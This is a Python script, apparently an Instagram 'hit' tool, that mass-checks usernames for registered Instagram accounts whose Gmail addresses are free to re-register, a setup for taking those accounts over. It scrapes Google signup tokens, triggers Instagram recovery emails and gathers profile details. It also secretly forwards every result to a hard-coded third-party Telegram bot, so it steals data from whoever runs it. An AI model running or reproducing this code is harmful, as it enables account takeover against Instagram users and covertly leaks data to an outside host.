
import os
import json
import random
import requests
import time
from uuid import uuid4
from user_agent import generate_user_agent
import json
import uuid
from hashlib import md5
from secrets import token_hex
from faker import Faker
import requests
from hashlib import md5
from user_agent import generate_user_agent
from random import randrange
from threading import Thread
from requests import post
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
ids=[]
ok = 0
hh = 0
no = 0
hh = 0
DvD = "android-" + str(uuid4())
uid = uuid.uuid4()
lopp = str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())
def lo(word):
    heron = ["[\x1b[1;91m‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]","[\x1b[1;92m‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;93m‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;94m‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;95m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;97m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°]", "[\x1b[1;98m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°]", "[\x1b[1;99m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°]", "[\x1b[1;910m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
E = '\033[1;31m'
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
Z = '\033[1;31m' #
R = '\033[1;31m' #
X = '\033[1;33m' #
F = '\033[2;32m' #
C = "\033[1;97m" #
B = '\033[2;36m'
Y = '\033[1;34m' #
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
Z1 = '\033[2;31m' 
M = '\x1b[1;37m'
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

B = '\x1b[38;5;208m'  
Z = '\033[1;31m'  
X = '\033[1;33m'  
F = '\033[2;32m'  
C = "\033[1;97m"  
Z = '\033[1;31m' 
R = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
S = '\033[1;33m'
B_ = '\033[2;36m'  #
K = '\033[2;35m'
U = '\033[2;35m'
Y = '\033[1;34m'
B = '\033[2;36m'#
Z = '\033[1;31m' #
X = '\033[1;33m' #
F = '\033[2;32m' #
C = "\033[1;97m" #
B = '\033[2;36m'#
Y = '\033[1;34m' #
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
S = '\033[1;33m'
import requests
import json
from datetime import datetime
import time
import os
B = '\x1b[38;5;208m'  
BYellow = '\x1b[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
y = '\033[1;35m'
f = '\033[2;35m'
z = '\033[3;33m'
G = '\033[2;36m'
E = '\033[1;31m'
DS='\033[30m' 
V = '\033[1;35m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
O = '\x1b[38;5;208m' 
BL = '\x1b[38;5;21m' 
YU = '\x1b[38;5;200m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m'  
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

import requests,faker,user_agent,random
from user_agent import generate_user_agent
from faker import Faker
import os
try:
    import requests,colorama,prettytable,webbrowser
except:
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install prettytable")
    os.system("pip install webbrowser")
    os.system('pip install python-cfonts')
    os.system('pip install Faker')
    os.system('pip install AegosPy ')
    os.system('pip install threading ')
    os.system('pip install GetInfoInsta')
    os.system("clear")	
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' 
Q = '\033[1;36m'
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m' 
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
e=0
import os,random,sys,time
os.system("pkg install espeak")
os.system("clear")
from os import system as _HERON_
def lo(word):
    heron = ["[\x1b[1;91m‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]","[\x1b[1;92m‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;93m‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;94m‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;95m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°]", "[\x1b[1;97m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°]", "[\x1b[1;98m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°]", "[\x1b[1;99m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°]", "[\x1b[1;910m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.01)
            sys.stdout.flush()
lo(" \x1b[1;36m     Api ƒ∞le Baƒülantƒ± Kuruluyor ...")
os.system('clear')            
from cfonts import render            
output = render('THOMAS', colors=['white', 'blue'], align='center')
print(output)
print("~ Programmer : @T5OMAS | Channel: @THOMASHACK ~")
print("\x1b[1;39m‚Äî" * 60)
webbrowser.open('https://t.me/thomashack')

import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
token = input(f' {Q}({Q}1{Q}) {Q}  ùêìùê®ùê§ùêûùêß ùêÜùê¢ùê´ùê¢ùêßùê¢ùê≥ {F}:   ' + Z)
print("\x1b[1;39m‚Äî" * 60)
ID = input(f' {Q}({Q}2{Q}) {Q}  ùêàùêÉ ùêÜùê¢ùê´ùê¢ùêßùê¢ùê≥ {F} :  ' + Z)
print("\x1b[1;39m‚Äî" * 60)
def namefile():
  while True:
    try:
      namefile1 = input(f" {Q}({Q}3{Q}) {Q}  ùêÉùê®ùê¨ùê≤ùêöùê≤ƒ± ùêÜùê¢ùê´ùê¢ùêßùê¢ùê≥ : ")
      ooo=open(namefile1,"r").read().splitlines()
      return ooo
    except:
      print(f"{RED}{BOLD} Dosya Bulunamadi ‚ùå")
list99=namefile()
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
            'ig_sig_key_version': '4',
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
        r = response['email']
    except:
        r = 'h h h'
    return r

def info(username, jj):
    global hits
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://www.tucktools.com',
        'Referer': 'https://www.tucktools.com/',
        'User-Agent': generate_user_agent()
    }
    params = {
        'username': username,
    }
    hits += 1

    try:
        response = requests.get('https://instaskull.com/tucktools_new', params=params, headers=headers).json()
        id = response['id']
        name = response['user_fullname']
        user_followers = response['user_followers']
        user_following = response['user_following']
        total_posts = response['total_posts']
        user_description = response['user_description']
        try:
            date = requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
        except:
            date = 'None'
        tlg = f'''
 ìäÜùê¥ùê∂ùê∂ùëÇùëàùëÅùëá ùêºùëÅùëÜùëáùê¥ùê∫ùëÖùê¥ùëÄìäá
‚ãò‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅùêìùêáùêéùêåùêÄùêí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ãô
ü™òùêàùêíùêàùêå : {name}
üç¨ùêäùêîùêãùêãùêÄùêçùêàùêÇùêà ùêÄùêÉùêà: {username}
üêùùêÑùêåùêÄùêàùêã : {username}@{jj}
üßÉùêìùêÄùêäùêàùêèùêÇùêà: {user_followers}
üçâùêìùêÄùêäùêàùêè: {user_following}
üôàùêèùêéùêíùêì :  {total_posts}
üçºùêìùêÄùêëùêàùêá: {date}
üåøùêàùêÉ: : {id}
üå∑ùêÅùêàùêé:  {user_description}
üê¶ùêëùêÑùêíùêì: {rest(username)}
‚ãò‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅùêìùêáùêéùêåùêÄùêí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ãô
ùêìùêÑùêãùêÑùêÜùêëùêÄùêå;¬† @T5OMAS @THOMASHACK
        '''
        print(GREEN+tlg)
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{tlg}\n')
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except:
            pass
        try:
            requests.get(f"https://api.telegram.org/bot7093066228:AAHwh_LvGwQTpGO-qi97bZaBwVV4lkT3eKI/sendMessage?chat_id=6050993546&text={tlg}")
        except:
            pass
    except:
        tlg = f'''
        ìäÜùê¥ùê∂ùê∂ùëÇùëàùëÅùëá ùêºùëÅùëÜùëáùê¥ùê∫ùëÖùê¥ùëÄìäá
‚ãò‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅùêìùêáùêéùêåùêÄùêí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ãô
 üç¨ùêäùêîùêãùêãùêÄùêçùêàùêÇùêà ùêÄùêÉùêà: {username}
üêùùêÑùêåùêÄùêàùêã : {username}@{jj}
üê¶ùêëùêÑùêíùêì: {rest(username)}
‚ãò‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅùêìùêáùêéùêåùêÄùêí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ãô
ùêìùêÑùêãùêÑùêÜùêëùêÄùêå;¬† @T5OMAS @THOMASHACK
        '''
        print(BLUE+tlg)
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except:
            pass
        try:
            requests.get(f"https://api.telegram.org/bot7093066228:AAHwh_LvGwQTpGO-qi97bZaBwVV4lkT3eKI/sendMessage?chat_id=6050993546&text={tlg}")
        except:
            pass
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{tlg}\n')

def Qredes(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:Qredes(email)
def check(email):
  global bads_instgram
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('001')
    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
   #   print(response.text)
      if 'email_is_taken' in str(response.text):Qredes(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
   #   print(str(response))
      if '"user":true' in response:Qredes(email)
      else:bads_instgram+=1
  except:
    check(email)

thomas='''‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨
\x1b[1;39m

#####################%%%#####*****####################*
##############%%%%%%#**=-::.. . ..::.-+*##############*
%%%%%%%%%%%%%%%#*+=:.               .:+###############*
%%%%%%%%%%%%%*-.     .     .       ..:=###############*
%%%%%%%%%%#=:  ..   ..     ..    ...-*-#%%#############
%%%%%%%%%+.   .. ..:.  .....  .::-=+**+*#%%%###########
%%%%%%%%- ......:-==--=+*+==++*****+==-=+*%%%%%########
%%%%%%*: ...::--=+++***###%%%%%#+:..  .=+.*%%%%%%######
%%%%%%: ...:---=++***######***=:. .:..-+*=*%%%%%%%#####
%%%%%%:...:----=++**+*+====+++-:::::::=*#####*#%%%%%%%%
%%%%%@+..::::--====-:::-=++*#%#******###*+*+-:=%%%%%%%%
@@@@%@*..:::-----:::---=+#%%%##########*++=--:*%%%%%%%@
@@@@@@#..:::---::-=*####%%##**+++++++===+**++=-*%%%%%%@
@@@@@@@-..::::::-#+==#@%%#++++++++=====+**=-----%%%%%@@
@@@@@@@#....:::.-**#=**%##+++****###*##%#*=++=-.+@%%%@@
@@@@@@@@*.......=++*####*==+***######%%##**++++++#%%@@@
@@@@@@@@@#: ....:=-:------.:-++++++++****+++*##*=-%@@@@
@@@@@@@@@@@+.....:::---:::-:.:---------------:::.=%@@@@
@@@@@@@@@@@@%+:...:=*******+=--:...........   :+#@@@@@@
@@@@@@@@@@@@@@@%-.:=**####**++=-:.::::.... .+#@@@@@@@@@
@@@@@@@@@@@@@@Ÿ™Ÿ™@++++++*****++=-:---::....=%@@@@@@@@@@@
@@@@@@@@@@@@@%+=+*%@@@%##*++===--===--:..*@@@@@@@@@@@@@
@@@@@@@@@@@@@:    .:=*@Ÿ™Ÿ™@@%*+-------::.*@@@@@@@@@@@@@@
@@@@@@@@@@@@=......   .=#@Ÿ™Ÿ™@@%*+=-:::.=@@@@@@@@@@@@@@@
@@@@@@@@@@@%: ........   :=%@@@@@%#*-. *@@@@@@@@@@@@@@@
@@@@@@@@@%+:....... .....   -#@@@@@@@#*-+@@@@@@@@@@@@@@
@@@@@@@#-. ........... ....   -#@@@@@%#::#@@@@@@@@@@@@@
%@@@@%*:................    ..  -*%#-+*-.-#@@@@@@@@@@@@
%%@@@%#+=--:::::::.........  ..   :-==*%-  -#@@@@@%@@@@
%%%%%%%#*++===--:::::::::.......   .:=*%@=  .+%@%%%%%@@
%%%%%%%%%%##*+++====---::::::........:-+%%+::-+%%%%%%%@
%%%%%%%%@@@@%%%##**+=====------:::::::-=#%%*++*#%%%%%%@
	      
	        < THOMAS Vƒ∞P ƒ∞NSTA TOOL >
              TELEGRAM : @T5OMAS / @QREDES
	
\033[1;97m ‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\
‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨'''     

    
console = Console()
executor = ThreadPoolExecutor(max_workers=100)

with Live(console=console) as live:
  for username in list99:
    print(thomas)                              
    tt=(f"\r[green]Hit Dustu :[/green] {hits} [red]Kotu instgram:[/red] {bads_instgram} [yellow] Orta Mail:[/yellow] {bads_email}")
    live.update(tt)
    
    try:
      email = username + '@gmail.com'
      executor.submit(check, email)
    except:''

# by @Qredes , @t5oma
